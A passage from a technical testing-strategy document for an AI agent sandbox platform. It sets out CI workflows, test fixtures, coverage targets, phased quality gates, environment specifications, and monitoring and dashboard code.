  generateMemoryPatterns(count: number): Pattern[] {
    return Array(count).fill(null).map((_, i) => ({
      sessionId: `session-${i}`,
      task: `Task ${i}`,
      output: {
        result: `Result ${i}`,
        metrics: {
          duration: 1000 + Math.random() * 5000,
          linesChanged: Math.floor(Math.random() * 100)
        }
      },
      reward: 0.7 + Math.random() * 0.3,
      success: Math.random() > 0.1
    }));
  }
}
```

---

## CI/CD Pipeline Integration

```yaml
# .github/workflows/sandbox-testing.yml
name: Sandbox Integration Testing

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [18.x, 20.x]

    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: ${{ matrix.node-version }}

      - name: Install dependencies
        run: npm ci

      - name: Run unit tests
        run: npm run test:unit -- --coverage

      - name: Check coverage threshold
        run: |
          npm run coverage:check -- --statements 80 --branches 75 --functions 80 --lines 80

      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage/coverage-final.json
          flags: unit-tests

  integration-tests:
    runs-on: ubuntu-latest
    services:
      docker:
        image: docker:dind
        options: --privileged

    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20.x

      - name: Install dependencies
        run: npm ci

      - name: Start Docker daemon
        run: |
          sudo systemctl start docker
          sudo chmod 666 /var/run/docker.sock

      - name: Run integration tests
        env:
          E2B_API_KEY: ${{ secrets.E2B_API_KEY }}
        run: npm run test:integration

      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: integration-test-results
          path: test-results/

  performance-tests:
    runs-on: ubuntu-latest-8-cores # Larger instance for perf tests

    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20.x

      - name: Install dependencies
        run: npm ci

      - name: Run performance tests
        run: npm run test:performance

      - name: Check performance regression
        run: |
          node scripts/check-performance-regression.js

      - name: Upload performance metrics
        uses: actions/upload-artifact@v3
        with:
          name: performance-metrics
          path: performance-results/

  security-tests:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20.x

      - name: Install dependencies
        run: npm ci

      - name: Run security tests
        run: npm run test:security

      - name: Run SAST scan
        uses: github/codeql-action/analyze@v2

      - name: Run dependency audit
        run: npm audit --audit-level=moderate

      - name: Check for vulnerabilities
        run: |
          npx snyk test --severity-threshold=high

  e2e-tests:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20.x

      - name: Install dependencies
        run: npm ci

      - name: Run E2E tests
        env:
          E2B_API_KEY: ${{ secrets.E2B_API_KEY }}
        run: npm run test:e2e

      - name: Upload E2E results
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: e2e-test-results
          path: e2e-results/

  quality-gates:
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-tests, performance-tests, security-tests, e2e-tests]

    steps:
      - uses: actions/checkout@v3

      - name: Download all test results
        uses: actions/download-artifact@v3

      - name: Check quality gates
        run: |
          node scripts/check-quality-gates.js

      - name: Generate consolidated report
        run: |
          node scripts/generate-test-report.js

      - name: Post results to PR
        if: github.event_name == 'pull_request'
        uses: actions/github-script@v6
        with:
          script: |
            const report = require('./test-report.json');
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: `## Test Results\n\n${report.summary}`
            });
```

---

## Test Data Management

```typescript
// tests/utils/test-data-manager.ts

/**
 * Test Data Management
 */
export class TestDataManager {
  private readonly dataStore: Map<string, any>;
  private readonly snapshots: Map<string, any>;

  constructor() {
    this.dataStore = new Map();
    this.snapshots = new Map();
  }

  /**
   * Create test fixture
   */
  async createFixture(name: string, data: any): Promise<void> {
    this.dataStore.set(name, data);
  }

  /**
   * Get test fixture
   */
  getFixture<T>(name: string): T {
    if (!this.dataStore.has(name)) {
      throw new Error(`Fixture not found: ${name}`);
    }
    return this.dataStore.get(name);
  }

  /**
   * Create snapshot for comparison
   */
  async createSnapshot(name: string, data: any): Promise<void> {
    this.snapshots.set(name, JSON.stringify(data, null, 2));
  }

  /**
   * Compare with snapshot
   */
  async compareSnapshot(name: string, data: any): Promise<boolean> {
    const snapshot = this.snapshots.get(name);
    if (!snapshot) {
      await this.createSnapshot(name, data);
      return true;
    }

    const currentData = JSON.stringify(data, null, 2);
    return snapshot === currentData;
  }

  /**
   * Seed database with test data
   */
  async seedDatabase(dataSet: string): Promise<void> {
    const data = await this.loadDataSet(dataSet);

    // Seed ReasoningBank
    const reasoningBank = new ReasoningBankClient({
      endpoint: 'quic://localhost:5433',
      jwt: 'test-token'
    });

    for (const pattern of data.patterns) {
      await reasoningBank.storePattern(pattern);
    }
  }

  /**
   * Cleanup test data
   */
  async cleanup(): Promise<void> {
    this.dataStore.clear();
    // Don't clear snapshots (persist across test runs)
  }

  private async loadDataSet(name: string): Promise<any> {
    const fs = require('fs').promises;
    const path = require('path');
    const dataPath = path.join(__dirname, '../fixtures', `${name}.json`);
    const data = await fs.readFile(dataPath, 'utf-8');
    return JSON.parse(data);
  }
}

/**
 * Test data fixtures
 */
export const testFixtures = {
  sandboxConfigs: {
    basic: {
      template: 'node',
      lifetime: 300,
      resources: {
        cpuMillis: 500,
        memoryMB: 512
      }
    },
    highPerformance: {
      template: 'node',
      lifetime: 600,
      resources: {
        cpuMillis: 2000,
        memoryMB: 2048
      }
    },
    restricted: {
      template: 'node',
      lifetime: 300,
      resources: {
        cpuMillis: 500,
        memoryMB: 512
      },
      network: {
        policy: 'restricted' as const,
        allowedHosts: ['api.anthropic.com']
      }
    }
  },

  tasks: {
    simple: 'Write a simple hello world function',
    complex: 'Refactor the entire authentication module to use OAuth2',
    batch: Array(10).fill(null).map((_, i) => `Refactor module-${i}.ts`)
  },

  patterns: {
    successful: {
      sessionId: 'test-session-success',
      task: 'Test task',
      output: { result: 'success' },
      reward: 0.95,
      success: true
    },
    failed: {
      sessionId: 'test-session-failed',
      task: 'Test task',
      output: { error: 'failure' },
      reward: 0.3,
      success: false
    }
  }
};
```

---

## Coverage Requirements

### Coverage Targets by Phase

| Component | Phase 1 | Phase 2 | Phase 3 | Phase 4 |
|-----------|---------|---------|---------|---------|
| **Sandbox Providers** | 85% | 85% | 85% | 90% |
| **Sandbox Manager** | 80% | 85% | 85% | 90% |
| **Coordinators** | 75% | 80% | 85% | 85% |
| **QUIC Transport** | 70% | 75% | 80% | 85% |
| **ReasoningBank Client** | 75% | 80% | 85% | 85% |
| **Federation Hub** | - | 75% | 80% | 85% |
| **Security Layer** | 90% | 90% | 90% | 95% |
| **Overall** | 80% | 80% | 85% | 90% |

### Coverage Enforcement

```typescript
// jest.config.js
module.exports = {
  coverageThreshold: {
    global: {
      statements: 80,
      branches: 75,
      functions: 80,
      lines: 80
    },
    './src/sandbox/': {
      statements: 85,
      branches: 80,
      functions: 85,
      lines: 85
    },
    './src/security/': {
      statements: 90,
      branches: 85,
      functions: 90,
      lines: 90
    }
  }
};
```

---

## Quality Gates

### Phase 1: Foundation

```yaml
quality_gates:
  unit_tests:
    min_pass_rate: 100%
    max_duration: 60s
    coverage:
      statements: 85%
      branches: 80%

  integration_tests:
    min_pass_rate: 95%
    max_duration: 5m

  performance:
    sandbox_startup_p95: <200ms (Docker), <500ms (E2B)
    max_regression: 5%

  security:
    critical_vulnerabilities: 0
    high_vulnerabilities: 0
```

### Phase 2: Hybrid Execution

```yaml
quality_gates:
  unit_tests:
    min_pass_rate: 100%
    coverage:
      statements: 80%

  integration_tests:
    min_pass_rate: 90%
    max_duration: 10m

  performance:
    latency_increase: <10% vs native
    success_rate: >90% (10-agent swarm)
    quic_rpc_latency_p95: <20ms

  security:
    critical_vulnerabilities: 0
    pen_test_pass_rate: 100%
```

### Phase 3: Full Sandbox

```yaml
quality_gates:
  unit_tests:
    min_pass_rate: 100%
    coverage:
      statements: 80%

  integration_tests:
    min_pass_rate: 90%

  performance:
    latency_increase: <25% vs native
    uptime: >99.9%
    cross_region_sync: <100ms

  security:
    tenant_isolation: 100% (zero leaks)
    critical_vulnerabilities: 0

  chaos:
    recovery_time: <30s
    data_loss: 0%
```

### Phase 4: Production

```yaml
quality_gates:
  all_tests:
    min_pass_rate: 99%
    coverage:
      statements: 85%

  performance:
    latency_increase: <10% vs native
    error_rate: <1%
    uptime: >99.99%

  security:
    security_audit: PASSED
    penetration_test: PASSED
    vulnerability_scan: PASSED

  cost:
    cost_per_swarm: <$0.10
```

---

## Test Environment Specifications

### Local Development Environment

```yaml
local_environment:
  os: Ubuntu 22.04 LTS
  docker:
    version: ">=24.0"
    compose_version: ">=2.20"

  resources:
    min_cpu: 4 cores
    min_memory: 8GB
    min_disk: 50GB

  services:
    - docker daemon
    - Node.js 18.x or 20.x
    - npm >=9.0

  setup:
    - npm install
    - docker pull node:20-alpine
    - npm run test:setup
```

### CI Environment

```yaml
ci_environment:
  runner: ubuntu-latest-8-cores

  services:
    - docker:dind

  environment_variables:
    - E2B_API_KEY (secret)
    - ANTHROPIC_API_KEY (secret)
    - NODE_ENV: test

  timeout: 60 minutes
```

### Staging Environment

```yaml
staging_environment:
  provider: AWS
  region: us-west-2

  infrastructure:
    - ECS Fargate cluster
    - 8 vCPU, 16GB memory per task
    - 100GB ephemeral storage

  services:
    - ReasoningBank Server (port 5433)
    - Federation Hub (port 5434)
    - Sandbox Manager
    - Monitoring stack (Prometheus + Grafana)

  network:
    - VPC with private subnets
    - NAT Gateway for outbound traffic
    - Security groups for service isolation
```

---

## Monitoring & Observability

### Test Execution Monitoring

```typescript
// tests/utils/monitoring.ts

/**
 * Test execution monitoring and observability
 */
export class TestMonitor {
  private readonly metrics: MetricsCollector;
  private readonly traces: TraceCollector;

  constructor() {
    this.metrics = new MetricsCollector();
    this.traces = new TraceCollector();
  }

  /**
   * Monitor test execution
   */
  async monitorTest(
    testName: string,
    testFn: () => Promise<void>
  ): Promise<TestMetrics> {
    const startTime = Date.now();
    const startMemory = process.memoryUsage();

    try {
      await testFn();

      return {
        name: testName,
        status: 'passed',
        duration: Date.now() - startTime,
        memory: process.memoryUsage().heapUsed - startMemory.heapUsed,
        cpu: await this.getCPUUsage()
      };
    } catch (error) {
      return {
        name: testName,
        status: 'failed',
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error)
      };
    }
  }

  /**
   * Collect performance metrics
   */
  async collectPerformanceMetrics(): Promise<PerformanceMetrics> {
    return {
      sandboxStartupLatency: await this.measureSandboxStartup(),
      quicRPCLatency: await this.measureQuicRPC(),
      throughput: await this.measureThroughput(),
      resourceUtilization: await this.measureResourceUtilization()
    };
  }

  /**
   * Generate performance report
   */
  async generatePerformanceReport(): Promise<string> {
    const metrics = await this.collectPerformanceMetrics();

    return `
# Performance Test Report

## Sandbox Startup Latency
- P50: ${metrics.sandboxStartupLatency.p50}ms
- P95: ${metrics.sandboxStartupLatency.p95}ms
- P99: ${metrics.sandboxStartupLatency.p99}ms

## QUIC RPC Latency
- P50: ${metrics.quicRPCLatency.p50}ms
- P95: ${metrics.quicRPCLatency.p95}ms
- P99: ${metrics.quicRPCLatency.p99}ms

## Throughput
- Agents per second: ${metrics.throughput.agentsPerSecond}
- RPC calls per second: ${metrics.throughput.rpcCallsPerSecond}

## Resource Utilization
- CPU: ${metrics.resourceUtilization.cpu}%
- Memory: ${metrics.resourceUtilization.memory}MB
- Disk: ${metrics.resourceUtilization.disk}MB
    `;
  }

  private async measureSandboxStartup(): Promise<LatencyMetrics> {
    const latencies: number[] = [];

    for (let i = 0; i < 100; i++) {
      const startTime = Date.now();

      const sandbox = await manager.createSandbox({
        template: 'node'
      });

      latencies.push(Date.now() - startTime);

      await sandbox.destroy();
    }

    return this.calculatePercentiles(latencies);
  }

  private async measureQuicRPC(): Promise<LatencyMetrics> {
    const latencies: number[] = [];
    const client = new ReasoningBankClient({
      endpoint: 'quic://localhost:5433',
      jwt: 'test-token'
    });

    for (let i = 0; i < 1000; i++) {
      const startTime = Date.now();

      await client.storePattern({
        sessionId: `perf-test-${i}`,
        task: 'Test',
        output: {},
        reward: 0.9,
        success: true
      });

      latencies.push(Date.now() - startTime);
    }

    return this.calculatePercentiles(latencies);
  }

  private calculatePercentiles(values: number[]): LatencyMetrics {
    const sorted = values.sort((a, b) => a - b);

    return {
      p50: sorted[Math.floor(sorted.length * 0.5)],
      p95: sorted[Math.floor(sorted.length * 0.95)],
      p99: sorted[Math.floor(sorted.length * 0.99)],
      avg: sorted.reduce((a, b) => a + b, 0) / sorted.length,
      max: sorted[sorted.length - 1]
    };
  }
}
```

### Observability Dashboard

```typescript
// tests/utils/dashboard.ts

/**
 * Real-time test execution dashboard
 */
export class TestDashboard {
  private readonly server: http.Server;
  private readonly wss: WebSocket.Server;

  constructor(port: number = 8080) {
    this.server = http.createServer(this.handleRequest.bind(this));
    this.wss = new WebSocket.Server({ server: this.server });

    this.setupWebSocket();
  }

  /**
   * Start dashboard server
   */
  async start(): Promise<void> {
    return new Promise((resolve) => {
      this.server.listen(8080, () => {
        console.log('Test dashboard available at http://localhost:8080');
        resolve();
      });
    });
  }

  /**
   * Broadcast test update
   */
  broadcastUpdate(update: TestUpdate): void {
    this.wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify(update));
      }
    });
  }

  private setupWebSocket(): void {
    this.wss.on('connection', (ws) => {
      // Send initial state
      ws.send(JSON.stringify({
        type: 'init',
        data: this.getCurrentState()
      }));
    });
  }

  private handleRequest(req: http.IncomingMessage, res: http.ServerResponse): void {
    if (req.url === '/') {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(this.renderDashboard());
    } else if (req.url === '/metrics') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(this.getMetrics()));
    }
  }

  private renderDashboard(): string {
    return `
<!DOCTYPE html>
<html>
<head>
  <title>Sandbox Integration Test Dashboard</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; background: #1e1e1e; color: #fff; }
    .metric { display: inline-block; margin: 10px; padding: 20px; background: #2d2d2d; border-radius: 8px; }
    .metric h3 { margin: 0 0 10px 0; }
    .metric .value { font-size: 32px; font-weight: bold; }
    .passed { color: #4caf50; }
    .failed { color: #f44336; }
    .pending { color: #ff9800; }
    #tests { margin-top: 20px; }
    .test { padding: 10px; margin: 5px 0; background: #2d2d2d; border-radius: 4px; }
  </style>
</head>
<body>
  <h1>🧪 Sandbox Integration Test Dashboard</h1>

  <div id="metrics">
    <div class="metric">
      <h3>Total Tests</h3>
      <div class="value" id="total">0</div>
    </div>
    <div class="metric">
      <h3>Passed</h3>
      <div class="value passed" id="passed">0</div>
    </div>
    <div class="metric">
      <h3>Failed</h3>
      <div class="value failed" id="failed">0</div>
    </div>
    <div class="metric">
      <h3>Coverage</h3>
      <div class="value" id="coverage">0%</div>
    </div>
  </div>

  <div id="tests"></div>

  <script>
    const ws = new WebSocket('ws://localhost:8080');

    ws.onmessage = (event) => {
      const update = JSON.parse(event.data);

      if (update.type === 'init') {
        renderState(update.data);
      } else if (update.type === 'test-update') {
        updateTest(update.data);
      }
    };

    function renderState(state) {
      document.getElementById('total').textContent = state.total;
      document.getElementById('passed').textContent = state.passed;
      document.getElementById('failed').textContent = state.failed;
      document.getElementById('coverage').textContent = state.coverage + '%';
    }

    function updateTest(test) {
      const testsDiv = document.getElementById('tests');
      const testDiv = document.createElement('div');
      testDiv.className = 'test';
      testDiv.innerHTML = \`
        <strong>\${test.name}</strong> -
        <span class="\${test.status}">\${test.status}</span>
        (\${test.duration}ms)
      \`;
      testsDiv.appendChild(testDiv);
    }
  </script>
</body>
</html>
    `;
  }
}
```

---

## Summary

This comprehensive testing strategy provides:

1. **80%+ coverage** across all components with enforced thresholds
2. **650+ unit tests** covering all sandbox abstractions
3. **20+ integration scenarios** testing real workflows
4. **Performance benchmarks** for 100, 1000, and 10000 concurrent agents
5. **Security testing** including penetration tests and isolation validation
6. **Chaos engineering** for resilience validation
7. **Automated CI/CD pipelines** with quality gates
8. **Real-time observability** via dashboard and metrics
9. **Test data management** with fixtures and snapshots
10. **Complete phase-by-phase quality gates** ensuring production readiness

### Next Steps

1. **Review and approve** testing strategy
2. **Set up CI/CD pipeline** with defined quality gates
3. **Implement unit tests** for Phase 1 components
4. **Configure test environments** (local, CI, staging)
5. **Establish monitoring** and observability infrastructure
6. **Begin test-driven development** following the testing pyramid

---

**Document Status:** Ready for Implementation
**Estimated Test Development Time:** 3-4 weeks (parallel with feature development)
**Test Maintenance:** Ongoing with each phase
**Last Updated:** 2025-11-08
